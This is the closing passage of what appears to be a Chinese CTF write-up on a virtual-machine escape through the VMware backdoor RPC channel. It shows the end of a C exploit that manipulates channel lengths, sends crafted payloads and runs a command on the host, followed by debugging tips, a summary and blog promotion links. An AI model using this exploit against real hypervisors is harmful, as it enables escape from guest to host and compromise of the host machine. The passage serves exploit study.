    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    ***/
    //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
    if(!res){
        printf("fail to recv finish2\n");
        return;
    }
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&pay1,&res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay2,&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay3,&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&res);
    run_cmd(s4);
    if(!res){
        printf("fail to set len\n");
        return;
    }
}
void main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf("text base :%p",text);
    getchar();
    exploit();
}

```

**0×4****Tips**

在调试的时候会遇到一个问题：如果直接在被攻击机编译运行 exp，运行到断点处会卡死，导致鼠标没法从虚拟机中拖出来。所以可以 ssh 连接到被攻击机，远程运行 exp 避免这个问题；或者可以在 exp 中加一行 sleep 防止卡在虚拟机里。  
另外调试时最好将虚拟机最小化，防止不小心把鼠标点到虚拟主机中卡死。

**0×5** **总结**

第一次调试虚拟机逃逸的题目，逆向分析的过程花了很大一部分时间，最后编写 EXP、调试的过程大部分工作都是仿照 Real World CTF 2018 Finals Station-Escape 进行，最后成功弹出计算器还是有些小激动的，也算是对利用 backdoor 这个攻击面的第一次尝试，收获很多。

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

```
- End -


精彩推荐

7月北京！ISC 2021全新升级，早鸟抢票通道正式开启！


【技术分享】PbootCms-3.04前台RCE挖掘过程


【技术分享】Largebin Attack for Glibc 2.31

戳“阅读原文”查看更多内容

```